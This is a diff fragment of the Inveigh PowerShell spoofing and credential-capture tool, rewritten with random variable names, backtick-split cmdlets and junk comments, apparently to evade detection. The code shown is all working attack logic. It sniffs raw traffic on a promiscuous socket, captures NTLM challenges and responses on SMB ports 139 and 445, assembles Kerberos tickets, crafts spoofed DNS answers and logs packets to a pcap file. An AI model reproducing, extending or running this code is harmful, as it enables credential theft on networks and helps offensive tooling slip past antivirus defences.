+    $dNEeFjOSSAqzEtXXByEFDclXxXe.Bind($kELpxOhdDtqIuBGwKgUdkeqHACHZxUSKgkbHsussadj)
+    $dNEeFjOSSAqzEtXXByEFDclXxXe.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll,$byte_in,$byte_out)
+    $JGhyxoIMSuOPHZLXbjdDZysCVBd = [System.BitConverter]::GetBytes($uJYtaPKHBkqYNTkyQSeECcLBxVkiaeVYMOZmxVHhhl)
+    [Array]::Reverse($JGhyxoIMSuOPHZLXbjdDZysCVBd)
+    $NzacYfJsqZUHMnRJtpphrZrmhXCbd = [System.BitConverter]::GetBytes($UdYfMnaGXJWMXhxYZmYdzwcmAzjlyonIBluDRRRurFD)
+    [Array]::Reverse($NzacYfJsqZUHMnRJtpphrZrmhXCbd)
+    $GdyRflIiJuuSiRDhkkCMfGiUyIqY = [System.BitConverter]::GetBytes($LvtxlyiEnOfiOybKhfWwKTUJzJGquSXviBRRk)
+    [Array]::Reverse($GdyRflIiJuuSiRDhkkCMfGiUyIqY)
+    $PqfBMFnJtCcQXwIFXnfncaQHK = [System.BitConverter]::GetBytes($fgjekbNhYQKGsQdqOkUhuYvojUQK)
+    [Array]::Reverse($PqfBMFnJtCcQXwIFXnfncaQHK)
+    $YhzxoVOuFgnzQnMstMOTmoSOzs = ne`w`-`ob`je`ct System.Collections.Generic.List[string]
+    $qQsKMpTBczQiMsGpIWDoHuTrLVVDvOij = ne`w`-`ob`je`ct System.Collections.Generic.List[string]
 
-    if($SmokeFang)
+    if($TUiftddccfYQxZeoLdwPKCLKmdiXZImsjJoICXnLErAY)
     {    
-        $PlantFoot = New-TimeSpan -Minutes $SmokeFang
-        $SmokeZebra = [System.Diagnostics.Stopwatch]::StartNew()
+        $DxsSnFHHOmoRPsGVLmvmVz = New-TimeSpan -Minutes $TUiftddccfYQxZeoLdwPKCLKmdiXZImsjJoICXnLErAY
+        $eZFhiyEfCPrTZbJeDstfnjObk = [System.Diagnostics.Stopwatch]::StartNew()
     }
 
-    [Byte[]]$RelyTank = 0xd4,0xc3,0xb2,0xa1,0x02,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff +
+    [Byte[]]$DCVkRFiHTXJycExwqXGBA = 0xd4,0xc3,0xb2,0xa1,0x02,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff +
         0xff,0x00,0x00,0x01,0x00,0x00,0x00
 
-    if($SlimyCable -eq 'File')
+    if($QXplYkjxeRFAgTbHwoZGdRyj -eq 'File')
     {
-        $RealCattle = $SilkySmelly + "\Inveigh-Packets.pcap"
-        $LeftKnock = [System.IO.File]::Exists($RealCattle)
+        $TpmxCuzKaiIVyutTAuPrhnmGWKRxjLCxRFJlXZBBQ = $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV + "\Inveigh-Packets.pcap"
+        $YAAYhEXOwaDjSJdNAYrQXCSOdmMBAxSkyHazk = [System.IO.File]::Exists($TpmxCuzKaiIVyutTAuPrhnmGWKRxjLCxRFJlXZBBQ)
         
         try
         {
-            $DogWrist = ne`w-`obje`ct System.IO.FileStream $RealCattle,'Append','Write','Read'
+            $eQuAaLZewdchKzENGMelcbMezYTquEGpXhOOdMP = ne`w`-`ob`je`ct System.IO.FileStream $TpmxCuzKaiIVyutTAuPrhnmGWKRxjLCxRFJlXZBBQ,'Append','Write','Read'
 
-            if(!$LeftKnock)
+            if(!$YAAYhEXOwaDjSJdNAYrQXCSOdmMBAxSkyHazk)
             {
-                $DogWrist.Write($RelyTank,0,$RelyTank.Count)
+                $eQuAaLZewdchKzENGMelcbMezYTquEGpXhOOdMP.Write($DCVkRFiHTXJycExwqXGBA,0,$DCVkRFiHTXJycExwqXGBA.Count)
             }
 
         }
@@ -3890,69 +3890,69 @@ $InnatePrefer =
         {
             $error_message = $_.Exception.Message
             $error_message = $error_message -replace "`n",""
-            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] Disabling pcap output") > $null
-            $SlimyCable = ''
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] Disabling pcap output") > $null
+            $QXplYkjxeRFAgTbHwoZGdRyj = ''
         }
 
     }
-    elseif($SlimyCable -eq 'Memory' -and !$LightOval.pcap)
+    elseif($QXplYkjxeRFAgTbHwoZGdRyj -eq 'Memory' -and !$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.pcap)
     {
-        $LightOval.pcap = ne`w-`obje`ct System.Collections.ArrayList
-        $LightOval.pcap.AddRange($RelyTank)
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.pcap = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.pcap.AddRange($DCVkRFiHTXJycExwqXGBA)
     }
 
-    while($LightOval.running -and $FixPowder)
+    while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running -and $yKxKGyrFSNBveiCOgkAkKLepuOJSnGEOoglXoczDsor)
     {
-        $WoodCar = $GroanDress.Receive($byte_data,0,$byte_data.Length,[System.Net.Sockets.SocketFlags]::None)
-        $FowlTrust = ne`w-`obje`ct System.IO.MemoryStream($byte_data,0,$WoodCar)
-        $ToothGrowth = ne`w-`obje`ct System.IO.BinaryReader($FowlTrust)
-        $version_HL = $ToothGrowth.ReadByte()
-        $ToothGrowth.ReadByte() > $null
-        $TopCast = Convert-DataToUInt16 $ToothGrowth.ReadBytes(2)
-        $ToothGrowth.ReadBytes(5) > $null
-        $GrainRob = $ToothGrowth.ReadByte()
-        $ToothGrowth.ReadBytes(2) > $null
-        $CampSkate = $ToothGrowth.ReadBytes(4)
-        $StuffSky = [System.Net.IPAddress]$CampSkate
-        $SystemCast = $ToothGrowth.ReadBytes(4)
-        $BattleSalt = [System.Net.IPAddress]$SystemCast
-        $TurkeyMove = [Int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
+        $AMQewCxOFzVNJKNOZyvxIpbTFGSlirlcCSfTBjk = $dNEeFjOSSAqzEtXXByEFDclXxXe.Receive($byte_data,0,$byte_data.Length,[System.Net.Sockets.SocketFlags]::None)
+        $knGyKHzBgCXpkjMLUJmgulXgSJWPNlUeId = ne`w`-`ob`je`ct System.IO.MemoryStream($byte_data,0,$AMQewCxOFzVNJKNOZyvxIpbTFGSlirlcCSfTBjk)
+        $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ = ne`w`-`ob`je`ct System.IO.BinaryReader($knGyKHzBgCXpkjMLUJmgulXgSJWPNlUeId)
+        $version_HL = $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadByte()
+        $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadByte() > $null
+        $ivqTQQwUhsyEHWgMyZcnlb = Convert-DataToUInt16 $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(2)
+        $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(5) > $null
+        $DZNzuHgzDWVtIfhfcIXUSqwZnQGwMpbA = $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadByte()
+        $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(2) > $null
+        $JtFIsLqKcVUSbVNjAtXnIyrwTnhO = $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(4)
+        $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd = [System.Net.IPAddress]$JtFIsLqKcVUSbVNjAtXnIyrwTnhO
+        $wjISUtgWuulmewARWIhZNLaVuvcg = $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(4)
+        $oykrKuVVEIoRCUDFEJUJvVjwnahnO = [System.Net.IPAddress]$wjISUtgWuulmewARWIhZNLaVuvcg
+        $wTacbwbwKtaCoXdTGJmhYATXfkHnhW = [Int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
         
-        switch($GrainRob)
+        switch($DZNzuHgzDWVtIfhfcIXUSqwZnQGwMpbA)
         {
             
             6 
             {  # Microsoft".
-                $StewSmelly = Convert-DataToUInt16 $ToothGrowth.ReadBytes(2)
-                $BuryRustic = Convert-DataToUInt16 $ToothGrowth.ReadBytes(2)
-                $ToothGrowth.ReadBytes(8) > $null
-                $HealthGrate = [Int]"0x$(('{0:X}' -f $ToothGrowth.ReadByte())[0])" * 4
-                $BloodyBoil = $ToothGrowth.ReadByte()
-                $ToothGrowth.ReadBytes($HealthGrate - 14) > $null
-                $ScaleAgree = $ToothGrowth.ReadBytes($WoodCar)
-                $BloodyBoil = ([convert]::ToString($BloodyBoil,2)).PadLeft(8,"0")
+                $OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg = Convert-DataToUInt16 $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(2)
+                $nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC = Convert-DataToUInt16 $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(2)
+                $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(8) > $null
+                $ygYkQsxDOgLNbUxvJATIGOyBUepDbZSvZgCQXpCU = [Int]"0x$(('{0:X}' -f $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadByte())[0])" * 4
+                $CeRAUIUkjUWZKSmexcMROXtskbdwoSNtwLIVMYusnYK = $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadByte()
+                $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes($ygYkQsxDOgLNbUxvJATIGOyBUepDbZSvZgCQXpCU - 14) > $null
+                $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy = $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes($AMQewCxOFzVNJKNOZyvxIpbTFGSlirlcCSfTBjk)
+                $CeRAUIUkjUWZKSmexcMROXtskbdwoSNtwLIVMYusnYK = ([convert]::ToString($CeRAUIUkjUWZKSmexcMROXtskbdwoSNtwLIVMYusnYK,2)).PadLeft(8,"0")
 
-                if($BloodyBoil.SubString(6,1) -eq "1" -and $BloodyBoil.SubString(3,1) -eq "0" -and $BattleSalt -eq $SmashDolls)
+                if($CeRAUIUkjUWZKSmexcMROXtskbdwoSNtwLIVMYusnYK.SubString(6,1) -eq "1" -and $CeRAUIUkjUWZKSmexcMROXtskbdwoSNtwLIVMYusnYK.SubString(3,1) -eq "0" -and $oykrKuVVEIoRCUDFEJUJvVjwnahnO -eq $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
                 {
-                    $WormNarrow = "$StuffSky`:$StewSmelly"
-                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] TCP($BuryRustic) SYN packet detected from $WormNarrow") > $null
+                    $ZGQrgOQbjkraypfhBgTvgAHQsPQSteAFZvPtnvd = "$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd`:$OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg"
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] TCP($nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC) SYN packet detected from $ZGQrgOQbjkraypfhBgTvgAHQsPQSteAFZvPtnvd") > $null
                 }
 
-                switch ($BuryRustic)
+                switch ($nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC)
                 {
 
                     139 
                     {
 
-                        if($ScaleAgree)
+                        if($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy)
                         {
-                            Get-SMBConnection $ScaleAgree $SmashDolls $StuffSky $BattleSalt $StewSmelly "139"
+                            Get-SMBConnection $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $oykrKuVVEIoRCUDFEJUJvVjwnahnO $OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg "139"
                         }
 
-                        if($LightOval.SMB_session_table.ContainsKey("$StuffSky`:$StewSmelly"))
+                        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table.ContainsKey("$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd`:$OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg"))
                         {
-                            Get-NTLMResponse $ScaleAgree $NorthAmuck $StuffSky $StewSmelly 139 "SMB"
+                            Get-NTLMResponse $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy $UgjMonOdclnvuXTUStjJPlyfcIaSHwykwOJbBB $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg 139 "SMB"
                         }
 
                     }
@@ -3960,31 +3960,31 @@ $InnatePrefer =
                     445
                     {
 
-                        if($RemindHammer.Count -lt $RateBabies -and "$StuffSky`:$StewSmelly" -eq $HumorRoof)
+                        if($WqTrCsstSbMGXjhlbGnPKYxQ.Count -lt $wZzzTVPPlcYArKIGiTrO -and "$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd`:$OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg" -eq $IlumPrYDZHIDffrWZCjHiLGEsXBvtslkiH)
                         {
-                            $RemindHammer += $ScaleAgree
+                            $WqTrCsstSbMGXjhlbGnPKYxQ += $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy
 
-                            if($RemindHammer.Count -ge $RateBabies)
+                            if($WqTrCsstSbMGXjhlbGnPKYxQ.Count -ge $wZzzTVPPlcYArKIGiTrO)
                             {
-                                New-KerberosKirbi $RemindHammer $YummyCrowd "SMB" 445 "$StuffSky`:$StewSmelly"
-                                $RateBabies = $null
-                                $RemindHammer = $null
-                                $HumorRoof = $null
+                                New-KerberosKirbi $WqTrCsstSbMGXjhlbGnPKYxQ $CgOGBlVwrTAUUWwYQzvrNoDcCeiMhHmDGRggrxFKuIq "SMB" 445 "$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd`:$OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg"
+                                $wZzzTVPPlcYArKIGiTrO = $null
+                                $WqTrCsstSbMGXjhlbGnPKYxQ = $null
+                                $IlumPrYDZHIDffrWZCjHiLGEsXBvtslkiH = $null
                             }
 
                         }
 
-                        if($ScaleAgree)
+                        if($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy)
                         {   
-                            $QuiltBed = Get-SMBConnection $ScaleAgree $SmashDolls $StuffSky $BattleSalt $StewSmelly "445"
-                            $RateBabies = $QuiltBed[0]
-                            $RemindHammer = $QuiltBed[1]
-                            $HumorRoof = "$StuffSky`:$StewSmelly"
+                            $jeafPUgCbNJdRozytqbvYYqtgebgGM = Get-SMBConnection $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $oykrKuVVEIoRCUDFEJUJvVjwnahnO $OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg "445"
+                            $wZzzTVPPlcYArKIGiTrO = $jeafPUgCbNJdRozytqbvYYqtgebgGM[0]
+                            $WqTrCsstSbMGXjhlbGnPKYxQ = $jeafPUgCbNJdRozytqbvYYqtgebgGM[1]
+                            $IlumPrYDZHIDffrWZCjHiLGEsXBvtslkiH = "$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd`:$OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg"
                         }
 
-                        if($LightOval.SMB_session_table.ContainsKey("$StuffSky`:$StewSmelly"))
+                        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table.ContainsKey("$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd`:$OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg"))
                         {
-                            Get-NTLMResponse $ScaleAgree $NorthAmuck $StuffSky $StewSmelly 445 "SMB"
+                            Get-NTLMResponse $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy $UgjMonOdclnvuXTUStjJPlyfcIaSHwykwOJbBB $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg 445 "SMB"
                         }
                     
                     }
@@ -3992,31 +3992,31 @@ $InnatePrefer =
                 }
 
                 # Microsoft".
-                switch ($StewSmelly)
+                switch ($OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg)
                 {
 
                     139 
                     {
 
-                        if($ScaleAgree)
+                        if($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy)
                         {
-                            $EggsExist = Get-SMBNTLMChallenge $ScaleAgree
+                            $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE = Get-SMBNTLMChallenge $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy
                         }
 
-                        if($EggsExist -and $BattleSalt -ne $StuffSky)
+                        if($eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE -and $oykrKuVVEIoRCUDFEJUJvVjwnahnO -ne $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd)
                         {
 
-                            if($StuffSky -eq $SmashDolls)
+                            if($thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd -eq $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
                             {
-                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $EggsExist sent to $BattleSalt`:$BuryRustic") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE sent to $oykrKuVVEIoRCUDFEJUJvVjwnahnO`:$nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC") > $null
                             }
                             else
                             {
-                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $EggsExist received from $BattleSalt`:$BuryRustic") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE received from $oykrKuVVEIoRCUDFEJUJvVjwnahnO`:$nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC") > $null
                             }
 
-                            $LightOval.SMB_session_table."$BattleSalt`:$BuryRustic" = $EggsExist
-                            $EggsExist = $null
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table."$oykrKuVVEIoRCUDFEJUJvVjwnahnO`:$nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC" = $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE
+                            $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE = $null
                         }
                     
                     }
@@ -4024,25 +4024,25 @@ $InnatePrefer =
                     445
                     {
 
-                        if($ScaleAgree)
+                        if($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy)
                         {
-                            $EggsExist = Get-SMBNTLMChallenge $ScaleAgree
+                            $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE = Get-SMBNTLMChallenge $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy
                         }
 
-                        if($EggsExist -and $BattleSalt -ne $StuffSky)
+                        if($eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE -and $oykrKuVVEIoRCUDFEJUJvVjwnahnO -ne $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd)
                         {
 
-                            if($StuffSky -eq $SmashDolls)
+                            if($thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd -eq $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
                             {
-                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $EggsExist sent to $BattleSalt`:$BuryRustic") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE sent to $oykrKuVVEIoRCUDFEJUJvVjwnahnO`:$nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC") > $null
                             }
                             else
                             {
-                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $EggsExist received from $BattleSalt`:$BuryRustic") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE received from $oykrKuVVEIoRCUDFEJUJvVjwnahnO`:$nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC") > $null
                             }
 
-                            $LightOval.SMB_session_table."$BattleSalt`:$BuryRustic" = $EggsExist                      
-                            $EggsExist = $null
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table."$oykrKuVVEIoRCUDFEJUJvVjwnahnO`:$nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC" = $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE                      
+                            $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE = $null
                         }
                         
                     
@@ -4050,26 +4050,26 @@ $InnatePrefer =
                 
                 }
 
-                if($SlimyCable -and ($BreezyDesign -contains $StewSmelly -or $BreezyDesign -contains $BuryRustic -or $BreezyDesign -contains 'All'))
+                if($QXplYkjxeRFAgTbHwoZGdRyj -and ($xiTnjmjZESCjsSHBdSaGp -contains $OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg -or $xiTnjmjZESCjsSHBdSaGp -contains $nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC -or $xiTnjmjZESCjsSHBdSaGp -contains 'All'))
                 {
 
-                    if($ScaleAgree)
+                    if($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy)
                     {
-                        $HangRigid = ([datetime]::UtcNow)-(Get-Date "1/1/1970")
-                        $SpringOffer = [System.BitConverter]::GetBytes($WoodCar + 14)
+                        $DqpkzBduRVXpHujodykWwWLweU = ([datetime]::UtcNow)-(Get-Date "1/1/1970")
+                        $ZyBwJuotrqFoSZqaTrzQWtnoYJWWAkEpwrTnwCseju = [System.BitConverter]::GetBytes($AMQewCxOFzVNJKNOZyvxIpbTFGSlirlcCSfTBjk + 14)
                         
-                        $PersonDetect = [System.BitConverter]::GetBytes([Int][Math]::Truncate($HangRigid.TotalSeconds)) + 
-                            [System.BitConverter]::GetBytes($HangRigid.Milliseconds) + # Microsoft".
-                            $SpringOffer +
-                            $SpringOffer +
+                        $bZyXbwpvvmxZhYHRIDLCedZ = [System.BitConverter]::GetBytes([Int][Math]::Truncate($DqpkzBduRVXpHujodykWwWLweU.TotalSeconds)) + 
+                            [System.BitConverter]::GetBytes($DqpkzBduRVXpHujodykWwWLweU.Milliseconds) + # Microsoft".
+                            $ZyBwJuotrqFoSZqaTrzQWtnoYJWWAkEpwrTnwCseju +
+                            $ZyBwJuotrqFoSZqaTrzQWtnoYJWWAkEpwrTnwCseju +
                             (,0x00 * 12) +
                             0x08,0x00 +
-                            $byte_data[0..($WoodCar - 1)]
+                            $byte_data[0..($AMQewCxOFzVNJKNOZyvxIpbTFGSlirlcCSfTBjk - 1)]
 
-                        if($PersonDetect.Count -eq ($WoodCar + 30))
+                        if($bZyXbwpvvmxZhYHRIDLCedZ.Count -eq ($AMQewCxOFzVNJKNOZyvxIpbTFGSlirlcCSfTBjk + 30))
                         {
 
-                            switch ($SlimyCable)
+                            switch ($QXplYkjxeRFAgTbHwoZGdRyj)
                             {
 
                                 'File'
@@ -4077,20 +4077,20 @@ $InnatePrefer =
 
                                     try
                                     {
-                                        $DogWrist.Write($PersonDetect,0,$PersonDetect.Count)    
+                                        $eQuAaLZewdchKzENGMelcbMezYTquEGpXhOOdMP.Write($bZyXbwpvvmxZhYHRIDLCedZ,0,$bZyXbwpvvmxZhYHRIDLCedZ.Count)    
                                     }
                                     catch
                                     {
                                         $error_message = $_.Exception.Message
                                         $error_message = $error_message -replace "`n",""
-                                        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+                                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                                     }
 
                                 }
 
                                 'Memory'
                                 {
-                                    $LightOval.pcap.AddRange($PersonDetect) 
+                                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.pcap.AddRange($bZyXbwpvvmxZhYHRIDLCedZ) 
                                 }
 
                             }
@@ -4105,61 +4105,61 @@ $InnatePrefer =
                 
             17 
             {  # Microsoft".
-                $StewSmelly = $ToothGrowth.ReadBytes(2)
-                $LittleLowly = Convert-DataToUInt16 ($StewSmelly)
-                $BuryRustic = Convert-DataToUInt16 $ToothGrowth.ReadBytes(2)
-                $SongsDouble = $ToothGrowth.ReadBytes(2)
-                $CrawlBrainy  = Convert-DataToUInt16 ($SongsDouble)
-                $ToothGrowth.ReadBytes(2) > $null
-                $ScaleAgree = $ToothGrowth.ReadBytes(($CrawlBrainy - 2) * 4)
+                $OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg = $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(2)
+                $faGTzGnMHxDNWDmxikWiLidyZdMakjiscEflfRBg = Convert-DataToUInt16 ($OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg)
+                $nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC = Convert-DataToUInt16 $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(2)
+                $WGGuhBmadSfnyovoozzAiFU = $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(2)
+                $VfUjqVsPWZRyGKIzaTyqCdTZmHJgSVAVqhxUipW  = Convert-DataToUInt16 ($WGGuhBmadSfnyovoozzAiFU)
+                $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(2) > $null
+                $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy = $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.ReadBytes(($VfUjqVsPWZRyGKIzaTyqCdTZmHJgSVAVqhxUipW - 2) * 4)
 
                 # Microsoft".
-                switch($BuryRustic)
+                switch($nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC)
                 {
 
                     53 # Microsoft".
                     {
-                        $WiseSquash = Get-NameQueryString 12 $ScaleAgree
-                        $GrowthShiny = $ScaleAgree[12..($WiseSquash.Length + 13)]
-                        [Byte[]]$SongsDouble = ([System.BitConverter]::GetBytes($GrowthShiny.Count + $GrowthShiny.Count + $StickLame.Length + 23))[1,0]
-                        $JazzyArrive = "[+]"
+                        $vFHZSPSNtCycYdounQRMVZOVRRTcn = Get-NameQueryString 12 $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy
+                        $IVmhQmxJBBMLrKHCGWvstTssO = $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[12..($vFHZSPSNtCycYdounQRMVZOVRRTcn.Length + 13)]
+                        [Byte[]]$WGGuhBmadSfnyovoozzAiFU = ([System.BitConverter]::GetBytes($IVmhQmxJBBMLrKHCGWvstTssO.Count + $IVmhQmxJBBMLrKHCGWvstTssO.Count + $zkTvnUBoWamaHbrMDvklWqGBdwC.Length + 23))[1,0]
+                        $uFsmsawLbDwlxnGQtMAdCzEw = "[+]"
 
-                        $GrowthShiny += 0x00,0x01,0x00,0x01 +
-                                                $GrowthShiny +
+                        $IVmhQmxJBBMLrKHCGWvstTssO += 0x00,0x01,0x00,0x01 +
+                                                $IVmhQmxJBBMLrKHCGWvstTssO +
                                                 0x00,0x01,0x00,0x01 +
-                                                $TailCharge +
+                                                $JGhyxoIMSuOPHZLXbjdDZysCVBd +
                                                 0x00,0x04 +
-                                                ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
